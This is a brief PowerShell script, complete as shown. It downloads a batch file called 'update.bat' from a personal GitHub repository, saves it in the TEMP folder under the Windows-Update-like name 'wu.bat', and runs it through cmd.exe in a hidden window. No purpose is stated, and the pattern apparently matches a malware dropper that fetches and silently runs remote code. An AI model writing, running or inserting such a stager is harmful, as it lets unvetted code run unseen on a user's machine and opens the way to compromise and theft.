$ErrorActionPreference = 'Stop'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$batUrl  = 'https://raw.githubusercontent.com/d3lph1nator/delpin4ik/main/update.bat'
$batPath = Join-Path $env:TEMP 'wu.bat'

Invoke-WebRequest -Uri $batUrl -OutFile $batPath -UseBasicParsing
Start-Process cmd.exe -ArgumentList "/c `"$batPath`"" -WindowStyle Hidden
